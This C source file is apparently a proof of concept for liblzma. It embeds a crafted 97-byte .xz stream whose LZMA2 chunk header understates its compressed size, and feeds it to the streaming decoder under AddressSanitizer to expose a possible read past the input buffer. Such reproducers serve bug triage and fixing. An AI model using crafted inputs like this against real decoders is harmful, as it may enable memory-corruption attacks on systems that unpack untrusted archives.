// SPDX-License-Identifier: 0BSD
//
// PoC: .xz stream whose first LZMA2 chunk header claims a compressed size
// that is smaller than the LZMA data actually needs, and the input buffer
// ends exactly at the claimed compressed size. Decoding is done through
// the public liblzma streaming API.
//
// The LZMA2 chunk decodes 5354 bytes of uncompressed data but is only given
// 67 bytes of range-coded data; the decoder still needs more input when the
// buffer ends.
//
// Build (with an ASan-instrumented liblzma):
//   cc -fsanitize=address -fno-omit-frame-pointer -g -O1 -o newbug \
//      pocs/newbug.c -I<repo>/src/liblzma/api -L<build> -llzma

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lzma.h"

static const uint8_t poc[97] = {
	0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00, 0x00, 0x04, 0xe6, 0xd6, 0xb4, 0x46,
	0x02, 0x00, 0x21, 0x01, 0x16, 0x00, 0x00, 0x00, 0x74, 0x2f, 0xe5, 0xa3,
	0xe0, 0x14, 0xe9, 0x00, 0x42, 0x5d, 0x00, 0x2a, 0x1a, 0x08, 0xa2, 0x03,
	0x25, 0x66, 0xf1, 0x4b, 0x78, 0xc5, 0xa2, 0x05, 0xff, 0x2e, 0xe6, 0xd9,
	0xd2, 0x20, 0x1a, 0xad, 0x34, 0xf8, 0xe2, 0x1d, 0xe8, 0x41, 0x36, 0xfa,
	0xdc, 0x06, 0x69, 0xbb, 0x3c, 0xe4, 0x10, 0x34, 0x27, 0x09, 0xeb, 0xb3,
	0x66, 0xe3, 0xed, 0x37, 0x98, 0xed, 0x92, 0xad, 0xd5, 0x27, 0x45, 0x08,
	0x30, 0x5e, 0x5d, 0x9a, 0x3c, 0x41, 0xc4, 0x18, 0x4a, 0x53, 0xf6, 0x6a,
	0xd9,
};

int
main(void)
{
	// The input buffer is exactly the size of the crafted stream so that
	// any read past the end of the buffer is detectable.
	uint8_t *in = malloc(sizeof(poc));
	if (in == NULL)
		return 1;

	memcpy(in, poc, sizeof(poc));

	uint8_t out[65536];

	lzma_stream strm = LZMA_STREAM_INIT;
	if (lzma_stream_decoder(&strm, UINT64_MAX, 0) != LZMA_OK) {
		fprintf(stderr, "lzma_stream_decoder() failed\n");
		return 1;
	}

	strm.next_in = in;
	strm.avail_in = sizeof(poc);
	strm.next_out = out;
	strm.avail_out = sizeof(out);

	const lzma_ret ret = lzma_code(&strm, LZMA_RUN);
	printf("lzma_code() returned %d\n", (int)ret);

	lzma_end(&strm);
	free(in);
	return 0;
}
